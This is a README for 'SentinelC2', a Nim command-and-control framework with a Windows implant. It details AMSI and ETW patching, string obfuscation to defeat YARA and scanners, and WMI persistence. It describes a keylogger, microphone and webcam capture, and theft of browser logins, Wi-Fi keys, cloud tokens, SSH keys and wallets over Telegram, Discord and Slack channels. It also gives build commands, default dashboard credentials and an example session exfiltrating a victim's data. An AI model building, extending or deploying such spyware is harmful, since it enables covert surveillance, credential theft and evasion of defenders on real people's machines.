# SentinelC2 — Nim Agent + Server (v3)

> Red-team C2 framework: Windows-implant agent (WebSocket-over-TLS,
> AES-256-GCM session crypto, HMAC-SHA-256 registration, AMSI bypass,
> ETW suppression, keylogger, mic capture, webcam capture, clipboard monitor, registry + scheduled-task persistence,
> screenshot, process list, clipboard, file search, browser / WiFi /
> cloud-token / SSH-key exfil, EDR/AV recon, Telegram backup channel,
> exfil), a multi-agent operator console, AND a real-time operator web
> dashboard (dark-themed 3-pane UI with live WebSocket push).
> Authorize before you point it anywhere.

## What's new in v3.5 — Operator web dashboard + AI-style auto-drive

This release adds an operator-grade web dashboard, geo-IP enrichment,
operator→agent file upload, and an autonomous "auto-drive" discovery mode
where the agent hunts for high-value loot on its own and the operator
one-click exfiltrates findings.

* **Operator web dashboard** (`http://server:8080/`)
  * Dark, operator-grade 3-pane UI: agent list (left), live log stream
    (center), agent state + files + loot (right). Real-time WebSocket
    push on `ws://server:8081` (separate listener, auto-reconnecting
    clients). Quick-action buttons for every toggle (keylog, mic,
    webcam, clipwatch, autodrive), inline image/audio/text preview
    overlay, toast notifications, command history in localStorage,
    auto-scroll with pause-on-hover, connection status badge,
    responsive layout. Cookie-based WebSocket auth so the browser can
    carry the session on the upgrade handshake.
  * REST API (port 8080, HTTP basic auth):
    * `GET /api/agents` — agent list (with `remote` + `geo` per agent)
    * `GET /api/state/<id>` — combined snapshot (system info, log
      size, recent files sorted by mtime, remote, geo)
    * `GET /api/log/<id>` — backfill for the live log stream
    * `GET /api/files/<id>` — recent exfil files for the right pane
    * `GET /api/loot/<id>` — cached auto-drive loot items
    * `GET /downloads/<id>/<file>` — raw file download
    * `POST /api/cmd` — queue a command (`{id, cmd, args}`)
    * `POST /api/upload` — operator→agent chunked file upload
      (`{id, path, data_b64, chunk_num, final}`)
  * Server-side log subscriber infrastructure (`logSubs` + `logSubsLock`)
    pushes new log lines to all connected dashboards via
    `sendWsFrameSafe` (which catches every exception so an aborted
    client socket can never crash the server).
* **Auto-drive discovery mode** (agent-side scanner, no exfil)
  * `autodrive start|stop` toggles a background scanner that walks
    Windows user paths and reports high-value findings WITHOUT
    exfiltrating anything. Each finding streams to the operator as
    a `loot` JSON event: `{kind, path, short, label, size, mtime,
    preview?}`.
  * Scan categories: `browser` (Chrome/Edge/Firefox Login Data,
    Cookies, Web Data, History, Bookmarks, Local State), `ssh`
    (`id_rsa*`, `known_hosts`, `config`, `*.pub`), `cloud` (AWS
    creds/config, GCP credentials, Azure CLI, Git credentials,
    kubeconfig), `wallet` (ETH keystore, BTC `wallet.dat`),
    `recent` (jump lists), `doc` (`.pdf`/`.docx`/`.xlsx`/`.txt`/
    `.csv`/`.pem`/`.env` <10 MB in `~/Documents`).
  * Dedupe via a per-agent audit file in `%TEMP%/.svc_audit` so only
    new findings stream back. Runs every 60 s once started.
  * Server stores loot per-agent (`lootStore` + `lootStoreLock`) and
    exposes `GET /api/loot/<id>`. The dashboard renders loot cards
    with a colored left border per kind (orange=browser, green=ssh,
    blue=cloud, red=wallet, purple=doc), a "Steal" button, optional
    preview text, and dedupe by path+kind on live push.
  * One-click "Steal" issues a normal `download <path>` command —
    intentional discovery-only-to-exfil split so the operator keeps
    control of what actually leaves the wire.
* **Operator→agent file upload UI**
  * Dashboard "Upload" button → hidden `<input type="file">` → the
    JS chunks the file into 512 KB base64 segments and POSTs each to
    `/api/upload`. Progress via toast notifications + log lines.
    `uploadInProgress` guard prevents concurrent uploads.
  * Server-side `buildCmdExt` attaches extra JSON fields (`path`,
    `data`, `final`) to the queued command so the agent's `upload`
    handler receives the chunks in-band.
* **Geo-IP enrichment**
  * Server resolves each agent's remote IP via `ip-api.com` (free,
    no key, HTTP, 45 req/min — cached per-IP in `geoCache` with
    `geoCacheLock`). Private/loopback/link-local IPs short-circuit
    to a `"private"` label so the dashboard shows `LAN` instead.
  * `Thread[GeoJob]` with a `ref object` bridges the sync HTTP
    lookup to the async Future (Nim's `createThread` requires
    `{.thread, nimcall.}` procs — no closure capture, data passed
    via thread argument).
  * Geo-IP surfaced in `/api/agents`, `/api/state/<id>`, the WS
    agent-list push, and quoted in the dashboard agent cards +
    right pane (orange "Source IP" / blue "Location" / "ISP" /
    "Org" / "Timezone" rows).
* **Server uptime + host in header** — `up 1m 8s · 127.0.0.1:8080 ·
  agents: 0` style metadata bar wired via WS so the dashboard header
  re-renders without polling.
* **Auto-select first agent on load** — when the WS agents handler
  first reports a non-empty list and the dashboard's `activeId` is
  null, it auto-calls `selectAgent(agents[0].id)`. Also graceful
  switching when the active agent disconnects.
* **Chromium URL-credentials fetch fix** — cookie `SameSite=Strict`
  → `SameSite=Lax`, plus a JS shim with `location.replace()` that
  strips credentials from the URL bar after auth so the browser
  doesn't try to re-send the Basic header on the credentials fetch.
* **Keylog toggle fix** — `keys start`/`keys stop` commands now
  correctly toggle the keylogger; the server CLI alias `k` was
  remapped to `keys` (it previously queued a `k` command the agent
  couldn't parse). Keylogger captures real keystrokes including
  `[BKSP]` for backspace.
* **Dead-code cleanup** (~92 lines) — `wsUpgradeFromRequest`,
  `wsLogHandler`, `wsAgentsHandler`, `SESSION_HEADERS`, `AsyncQueue`
  + methods, `hexToBytes`, `PBKDF2_ITER`, unused imports removed.
* **Python E2E test harness** (`tests/e2e_harness.py`)
  * Simulates a real agent (raw-socket WebSocket + AES-256-GCM
    crypto handshake) and drives the dashboard REST API to verify
    every feature in one sweep.
  * 26 assertions across: agent registration, all REST endpoints,
    command dispatch (keys/shell), file chunk transfer, toggles,
    upload, auto-drive + loot (browser/ssh discovery, steal =
    download), panic/persist/ps. Run with:
    `python tests/e2e_harness.py --start` (launches c2_server,
    runs tests, kills it).

* **OPSEC hardening pass (8 layered controls)** — see the dedicated
  "OPSEC hardening (v3.5+)" section below. Highlights: dynamic DLL
  loading (clean IAT), per-build rolling-key string obfuscation,
  obfuscated `AGENT_SECRET`, TLS certificate pinning, WMI permanent
  event subscription persistence (engagement+ variants), Discord /
  Slack webhook beacon channel, dead-man's switch fail-safe
  (`DEAD_MAN_SECS` default 30 days), zero build warnings.

## What's new in v3

* **AMSI bypass** — patches `amsi.dll!AmsiScanBuffer` at agent startup
  to return `E_INVALIDARG` (AMSI_RESULT_CLEAN). Without this, every
  PowerShell command the operator runs through `shell` gets logged.
* **ETW suppression** — patches `ntdll!EtwEventWrite` and
  `EtwEventWriteEx` to a single `ret`. Silences the agent's contribution
  to Event Tracing for Windows.
* **Direct syscall stub** — `doSyscall` resolver reads the syscall
  number from a clean ntdll function prologue, dispatches via inline
  asm. Foundation for ntdll-hook bypass; in this build it's a
  *demonstrator* (real engagement use would need per-NT-call typed
  wrappers — see TODO).
* **String obfuscation** — every signatured literal (`amsi.dll`,
  `AmsiScanBuffer`, `EtwEventWrite`, `wlan`, `.aws`, `id_rsa`, etc.)
  is XOR-encoded with a per-build key at compile time, decoded
  on the fly. `strings agent.exe | grep` returns 0 hits for these.
  Verified: `amsi.dll=0`, `EtwEventWrite=0`, `wlan=0`, `.aws=0`,
  `id_rsa=0` after build.
* **Telegram backup C2** — if configured (`TELEGRAM_BOT` /
  `TELEGRAM_CHAT`), the agent pings a Telegram bot at boot, on
  every successful registration, and after every `exfil`. Operator
  can also push freeform notifications via the `tg` command.
  Uses HTTPS POST to `api.telegram.org` (works through most
  networks, even with the WSS tunnel down).
* **Data exfil module** — 8 kinds, all staging into `%TEMP%\svc\*`:
  * `browser` — Chrome/Edge/Firefox user data (History, Login Data,
    Cookies, Web Data, Bookmarks, Local State — server-side decoder
    uses Local State's AES key + DPAPI for logins)
  * `wifi` — `netsh wlan export profile` → all saved WiFi profiles
    with cleartext PSK
  * `cloud` — AWS credentials, AWS config, GCP credentials, Azure,
    `.git-credentials`, `kubeconfig`
  * `ssh` — `id_rsa*`, `known_hosts`, `config`
  * `wallet` — Ethereum keystore, Bitcoin `wallet.dat`, MetaMask
    extension data
  * `recent` — Windows Recent (`*.lnk`) jump lists
  * `wincreds` — `vaultcmd /listcreds` output (names + targets, not
    the secrets)
* **Recon module** — 5 kinds:
  * `edr` — tasklist-based detection of CrowdStrike, SentinelOne,
    Defender, Cylance, Trend, ESET, Kaspersky, McAfee, etc.
  * `shares` — `net view` / `net share` / `net session`
  * `software` — `wmic product` (installed software) + `wmic qfe`
    (patch level)
  * `usb` — `USBSTOR` and `MountedDevices` registry
  * `tasks` — `schtasks /query /v` for the whole system

## Build status

| Binary       | Source        | Flags                                                              | Size      |
|--------------|---------------|--------------------------------------------------------------------|-----------|
| `agent_silent.exe` | `agent.nim` | `c -d:release -d:ssl --opt:size --app:gui --passL:-s` | ~0.94 MB |
| `agent_engagement.exe` | `agent.nim` | `-d:variant_engagement` (above)                                | ~0.94 MB |
| `agent_aggressive.exe` | `agent.nim` | `-d:variant_aggressive` (above)                                | ~0.95 MB |
| `c2_server.exe` | `c2_server.nim` | `c -d:release -d:ssl --opt:size --app:gui --passL:-s`       | ~0.84 MB |

> `build.ps1` regenerates `xorkey.nim` (random 16-byte rolling XOR key)
> before each variant compile, so each binary's obfuscated strings are
> unique. Final binaries have **only `KERNEL32.dll` + `msvcrt.dll`** in
> their IAT (verified via `tests/pe_imports.py`).

Verified on: **Nim 2.2.10** with **nimcrypto 0.7.3**, **winim 3.9.4**,
**ws 0.6.0**, **MinGW gcc 6.3.0**.

Smoke tests in this session:
* `c2_server.exe` starts, binds `ws://0.0.0.0:8443` (agent listener),
  `http://0.0.0.0:8080/` (dashboard), `ws://0.0.0.0:8081` (dashboard
  WS). `BuildPrefix X7K` visible.
* WebSocket handshake from a simulated agent → registers and
  receives AES-GCM encrypted commands. Verified end-to-end
  with `tests/e2e_harness.py` (26/26 assertions pass).
* All four agent binaries + c2_server build clean.

## Telegram backup C2

The agent sends `sendMessage` and `sendDocument` to the configured
Telegram bot. The bot token is compiled in (set the consts in
`agent.nim` before build):

```nim
const
  TELEGRAM_BOT  = ""  # e.g. "123456:ABCDEF..."
  TELEGRAM_CHAT = ""  # e.g. "-1001234567890" (chat or channel)
```

If either is empty, Telegram is disabled and the agent behaves like
v2. If both are set:

* On boot: `telegramSend("[X7K boot] <host>/<user>")`
* On successful registration: `telegramSend("[X7K agent] <id> <host>/<user>")`
* After every `exfil`: `telegramSend("[X7K exfil] <kind> (<count> files)")`
* `tg` command from the operator: `telegramSend("<freeform>")`

The Telegram bot is treated as compromised (the token is in the
binary, anyone who reverses it can read everything). For real
engagements, the bot is registered to a throwaway account and the
chat is a private channel the engagement team monitors.

## Architecture

```
agent (Windows host)         operator workstation          Tailscale / tunnel
+--------------------+       +---------------------+       +------------------+
| AMSI/ETW bypass    |  WSS  |  c2_server          |  WS   |  Tailscale node  |
| string obf         |<--->|  ws://127.0.0.1:443 |<--->|  desktop-*.ts.net|
| syscall stub       |  443  |  per-agent queues   |  443  |  Funnel (TLS)    |
| browser/wifi/ssh   |       |  session logs       |       |                  |
| cloud/wallet/media |       |  download assembler |       |                  |
| persist (reg+st)   |       |                     |       |                  |
+--------------------+       +---------------------+       +------------------+
                       │
                       │  HTTPS POST
                       ▼
              api.telegram.org/bot.../sendMessage
              (operator's Telegram bot / channel)
```

## Protocol v2 (unchanged from previous version)

```
Wire (after registration):  nonce(12) || ciphertext || tag(16)
AAD:                        agent_id || direction (0x00 S→A, 0x01 A→S)
Session key:                HMAC-SHA256(secret, server_nonce || agent_nonce)
Per-frame nonce:            4-byte BE counter || 8 random bytes
Registration:               HMAC-SHA256(secret, payload) once
```

## New commands

| Command     | Args                          | What it does                                  |
|-------------|-------------------------------|-----------------------------------------------|
| `exfil`     | `browser`                     | Stage Chrome/Edge/Firefox user data SQLite + Local State into `%TEMP%\svc\browser\` |
| `exfil`     | `wifi`                        | `netsh wlan export profile` → all profiles into `%TEMP%\svc\wifi\` |
| `exfil`     | `cloud`                       | Stage `~/.aws/credentials`, `~/.config/gcloud/credentials`, `~/.azure`, `~/.git-credentials`, `~/.kube/config` |
| `exfil`     | `ssh`                         | Stage `~/.ssh/id_rsa*`, `known_hosts`, `config` |
| `exfil`     | `media`                       | Stage *existing* audio/video files from Videos / Music / Downloads / Documents (capped at 500 MB) |
| `exfil`     | `wallet`                      | Stage Ethereum keystore, Bitcoin `wallet.dat`, MetaMask extension dir |
| `exfil`     | `recent`                      | Stage Windows Recent (`*.lnk`) jump lists |
| `exfil`     | `wincreds`                    | Run `vaultcmd /listcreds`, save to `%TEMP%\svc\wincreds.txt` |
| `recon`     | `edr`                         | tasklist-based EDR/AV detection (CrowdStrike, SentinelOne, Defender, etc.) |
| `recon`     | `shares`                      | `net view`, `net share`, `net session` |
| `recon`     | `software`                    | `wmic product` + `wmic qfe` patch inventory |
| `recon`     | `usb`                         | `USBSTOR` + `MountedDevices` registry |
| `recon`     | `tasks`                       | `schtasks /query /v` |
| `tg`        | (freeform text)               | Push a notification to the operator's Telegram bot |
| `hook`      | (freeform text)               | Push a notification to the operator's Discord/Slack webhook (set `CLOUD_WEBHOOK_URL` at compile time, obfuscated) |
| `autodrive` | `start` / `stop`              | Toggle the background loot-discovery scanner (see "Auto-drive" above). Reports findings as `loot` JSON events; the dashboard renders them as one-click "Steal" cards. |
| `keys`      | `start` / `stop`              | Keylogger toggle (the dashboard "Keys" button uses this). The server alias `k` also maps here. |

After an exfil, the operator runs `download <id> <staging-path>` to
pull the staged files over the WSS channel. The full staging path
is returned in the exfil result JSON.

### String-obfuscation coverage

`amsi.dll`, `AmsiScanBuffer`, `ntdll.dll`, `EtwEventWrite`,
`EtwEventWriteEx`, `netsh`, `wlan`, `export profile`, `Google\Chrome`,
`Microsoft\Edge`, `Mozilla\Firefox`, `History`, `Login Data`,
`Cookies`, `Web Data`, `Bookmarks`, `Local State`, `Ethereum`,
`Bitcoin`, `MetaMask`, `keystore`, `id_rsa`, `known_hosts`,
`.ssh`, `.aws`, `credentials`, `.config`, `gcloud`, `.azure`,
`.git-credentials`, `.kube`, `USERPROFILE`, `APPDATA`,
`LOCALAPPDATA`, `Profile`, `Default` — all XOR-encoded at
compile time, 0 occurrences in the binary.

The EDR indicator list inside `reconEdrAv` is still a literal
`seq[string]` and shows up under `strings` (the file is 4 hits:
`cb.exe`, `CylanceSvc`, `SentinelAgent`, etc.). Easy follow-up
to obfuscate that too.

## Setup

### 1. Toolchain (already installed on this box)

* Nim 2.2.10 at `D:\appdata\nim-2.2.10\bin\nim.exe`
* gcc 6.3.0 (MinGW) on PATH
* Nimble packages: `nimcrypto 0.7.3`, `winim 3.9.4`, `ws 0.6.0`

```powershell
# Toolchain (clean box)
winget install NimLang.Nim
nimble install nimcrypto
nimble install winim
nimble install ws
```

### 2. Configure

The agent and server both hard-code:

* `AGENT_SECRET` / `SECRET` — must match
* Agent `C2_URLS` — list of WSS endpoints (failover)
* Server `LISTEN_HOST` / `LISTEN_PORT`
* `BuildPrefix` — top-level `const` in both files
* `TELEGRAM_BOT` / `TELEGRAM_CHAT` — only in `agent.nim`, leave
  empty to disable

### 3. Build

```powershell
cd "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim"

# Agent (stripped, GUI subsystem, optimized for size)
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim

# Server
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl --threads:on c2_server.nim

# Tests
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -r -d:release tests/test_crypto.nim

# E2E harness (Python) — launches c2_server, simulates an agent,
# and drives the dashboard REST API. 26/26 assertions pass.
python tests/e2e_harness.py --start
```

## Web dashboard

Reporting-only view from the operator's laptop; the agent listener and
the dashboard run as separate ports inside `c2_server.exe`:

| Port | Protocol | Purpose |
|------|----------|---------|
| 8443 | WS (agent)  | Real agents connect here, do the HMAC + AES-GCM handshake |
| 8080 | HTTP (basic auth) | Dashboard UI + REST API |
| 8081 | WS (dashboard) | Real-time push to operator dashboards (agent list, log lines, loot events) |

Open `http://<server>:8080/` in a browser, authenticate with
`operator` / `S3nt1n3l-C2-D3v-Only-CHANGEME` (defaults — change before
any real engagement, see the `WEB_AUTH_*` consts in `c2_server.nim`).

Layout:
* **Left pane** — agent cards with hostname, user, OS, privilege level,
  geo-IP (`country, city`), local uptime, quick-action buttons
  (Keys, Mic, Cam, Clip, Clipwatch, Screenshot, Upload, Auto-Drive).
  Click a card to select; the first connected agent auto-selects on
  dashboard load. If the active agent disconnects the dashboard
  gracefully switches to the next one.
* **Center pane** — live log stream (RES log backfill + WS real-time
  push). Inputs at the bottom: command text field with `cmd`/`args`
  split + a quick-action bar. Auto-scroll pauses on hover; connection
  status badge lights up green/amber/red.
* **Right pane** — three stacked sections:
  1. **Agent State** — hostname, OS, user, privileges, uptime, log
     size; orange "Source IP" + blue "Location/ISP/Org/Timezone" rows
     from the geo-IP enrichment. Smart auto-refetch: when the active
     agent's geo resolves via WS push, this section refreshes if it
     doesn't already have geo rows.
  2. **Files** — recent exfil files sorted by mtime with size + MIME
     type. Click "Upload" to push a file back to the agent
     (chunked 512 KB base64 segments). Click a file row to preview
     inline (image → `<img>` overlay, audio → `<audio>`, text →
     `<pre>`).
  3. **Loot** — auto-drive discovery results rendered as cards with
     a colored left border per kind (orange=browser, green=ssh,
     blue=cloud, red=wallet, purple=doc), badge, label, path,
     size+mtime, optional preview text, and a "Steal" button. Live
     loot pushes dedupe by path+kind.

## Usage

```
X7K> help
Commands:
  list                           - list connected agents
  help                           - this text
  shell/sh <id> <cmd>            - run shell command
  download/dl <id> <path>        - download file from agent
  upload/up <id> <remotepath> <base64>
  screenshot/ss <id>             - take screenshot
  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp
  ps <id>                        - list processes on agent
  clip <id>                      - get clipboard
  find <id> <path>;<mask>        - find files
  keys/k <id> {start|stop}       - keylogger control
  mic/m <id> [seconds]           - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav
  listen <id>                    - start live mic stream -> downloads/mic_live_<ts>.wav (open in ffplay/vlc)
  unlisten <id>                  - stop live mic stream and finalize file
  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt
  unclipwatch <id>               - stop clipboard monitor
  persist/p <id>                 - re-establish persistence
  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds
  recon <id> <kind>              - edr|shares|software|usb|tasks
  killdate <id> <unix_ts>        - set kill date (0 = clear)
  sleep <id> <minutes>           - set sleep between reconnects
  tg <id>                        - telegram-test ping
  kill/x <id>                    - uninstall and quit
  quit                           - exit server
```

### Example operator session

```
X7K> list
ID               Host     User       OS              Uptime
123456789012     WIN10    alice      Windows 10      00:00:42

X7K> recon 123456789012 edr
[<] 123456789012: {"type":"recon","kind":"edr","hits":["MsMpEng"]}

X7K> exfil 123456789012 browser
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"browser","staging":"...","count":7}

X7K> dl 123456789012 C:\Users\alice\AppData\Local\Temp\svc\browser
[+] 123456789012 -> browser/Default/History
[+] 123456789012 -> browser/Default/Login Data
...

X7K> exfil 123456789012 cloud
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"cloud","staging":"...","count":4}

X7K> exfil 123456789012 ssh
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"ssh","staging":"...","count":6}

X7K> tg 123456789012 high-value host pwned, see logs
[>] Queued for 123456789012
[<] 123456789012: [X7K] tg: ok
# Operator's phone buzzes with the Telegram notification.
```

## OPSEC hardening (v3.5+)

The framework ships with eight layered hardening controls aimed at
the most commonly signatured behaviors a static/dynamic AV scan or
an EDR analyst will check.

### 1. Dynamic DLL loading (mic + webcam)
Both `winmm.dll` and `avicap32.dll` are resolved at runtime via
`LoadLibraryA` + `GetProcAddress` with obfuscated DLL/proc names.
Neither DLL appears in the agent's IAT — verified via
`tests/pe_imports.py`. Only `KERNEL32.dll` and `msvcrt.dll` are
statically imported.

### 2. TLS certificate pinning (WSS)
If `PINNED_CERT_PEM` is non-empty at compile time, the agent pins
the WSS trust anchor to ONLY that certificate. The OS trust store
is bypassed. Corporate TLS-inspection proxies presenting their own
cert are rejected at the handshake; the agent retries failover
URLs instead.

### 3. Per-build rolling-key string obfuscation
String literals (DLL names, registry paths, AMSI/ETW function names,
wallet/SSH/cloud paths, the agent secret) are XOR-encoded at compile
time with a 16-byte key. `build.ps1` generates a fresh random key
before each agent variant compile, so the same plaintext produces
different ciphertext in each binary. Defeats static string
scanners and YARA rules.

### 4. Obfuscated `AGENT_SECRET`
The HMAC secret is stored as XOR'd ciphertext bytes in `.rdata` and
only decrypted on first call into a runtime string. `strings.exe`
and hex editors do not see it; the plaintext is reconstructed in
heap memory transiently.

### 5. Quiet persistence — WMI permanent event subscription
`engagement` and `aggressive` variants skip `schtasks` + the HKCU
Run key (both heavily signatured). Instead they create a
`__EventFilter` + `CommandLineEventConsumer` +
`__FilterToConsumerBinding` triple in `ROOT\subscription`, firing on
`Win32_LogonSession` logon type 2 (interactive logon). The
subscription lives in the CIM repository, not the registry or Task
Scheduler. Cleanup tears down all three components by name on
`selfCleanup`.

### 6. Discord / Slack webhook beacon channel
Optional `CLOUD_WEBHOOK_URL` (compile-time, obfuscated) — agent
posts boot notifications, registration events, and operator
`hook <text>` commands to a Discord or Slack incoming-webhook URL.
Auto-detects format (`content` vs `text`) from the URL host. Blends
with normal corporate HTTPS traffic to `discord.com` /
`hooks.slack.com`, both of which are rarely DLP-flagged.

### 7. Kill-switch fail-safe (dead-man's switch)
Each successful C2 registration stamps `lastContact` into the
encrypted meta blob. On every agent boot, if `now - lastContact >
DEAD_MAN_SECS` (default 30 days) AND `lastContact > 0`, the agent
calls `panicWipe()` — shreds meta + staged files, tears down all
persistence, deletes its own copy, and exits. Prevents the agent
from lingering after an engagement ends (C2 seized, operator lost
access).

### 8. Build warnings cleanup
Zero unused-import, unused-symbol, or deprecation warnings in a
clean `build.ps1` run. Each agent variant compiles with `[SuccessX]`
in ~30 s and ends at 0.93–0.95 MB.

### OPSEC trade-offs
The framework survives 4–12 hours on lightly-monitored Windows
hosts out of the box. For long-running engagements against
moderately-monitored targets (Defender ATP, Elastic EDR), plan
on the following additional measures on top of this baseline:
- Custom per-engagement rolling key in `xorkey.nim` (already
  supported by `build.ps1`; just delete the auto-generated file
  and write your own).
- TLS pinning against your own self-signed cert
  (`PINNED_CERT_PEM` compile-time constant, full PEM).
- Tuned `BEACON_INTERVAL` (10 s default → bump to minutes for
  quiescent ops).
- Custom `DEAD_MAN_SECS` per engagement.

For "months on a hardened enterprise with CrowdStrike / Defender
for Endpoint" the framework would need: in-memory-only execution
(no on-disk copy), ETW suppression, AMSI bypass BEFORE first
process spawn, encrypted command queue, and sleep + jitter
obfuscation. These are out of scope for this build.

## Detection / hardening notes

* **AMSI bypass** patches `AmsiScanBuffer` to return `E_INVALIDARG`.
  Detected by: Defender for Endpoint (script-block telemetry),
  CrowdStrike (userland hook integrity check), and most modern
  EDRs. Effective against Defender *basic* and most legacy AVs.
  For higher-tier EDRs use the alternate approach: never call
  AmsiScanBuffer at all (load powershell with `-NoExit` and a
  pre-patched AMSI stub in a separate process).
* **ETW suppression** patches `EtwEventWrite`/`EtwEventWriteEx`.
  Detected by: any EDR with kernel-mode ETW consumers
  (CrowdStrike, Defender ATP). For real bypass you'd also need
  to disable `EtwThreadInfo` and patch `ntdll!EtwNotifyTrace`.
* **Direct syscall stub** is in this build as a *demonstrator*
  (resolves syscall numbers, has a generic dispatcher). To use
  it for evasion, write per-NT-call typed wrappers — the current
  `doSyscall` only handles 4 register args and won't reach
  `NtAllocateVirtualMemory`'s 6 args. **TODO for real engagement.**
* **String obfuscation** XOR-encodes the literals at compile time
  with a single-byte key. A determined reverse engineer recovers
  the strings trivially (`for (i = 0; i < len; i++) str[i] = enc[i] ^ 0x5A`).
  For higher OPSEC, use a multi-byte rolling key derived from a
  per-build constant.
* **Telegram** is a passive notification channel, not a stealth
  transport. The bot token is recoverable from the binary.
  Anything you push to Telegram, you should assume the blue team
  sees.
* **`META_FILE`** is still XOR-encrypted (v2). For a real
  engagement swap for DPAPI (`CryptProtectData` against
  `LocalMachine`).

## Legal

Use only on systems and accounts you own or are explicitly
authorized to test. Keep `C2_URLS`, `AGENT_SECRET`,
`TELEGRAM_BOT` and `TELEGRAM_CHAT` out of any git-tracked source.
Rotate all of them per engagement.
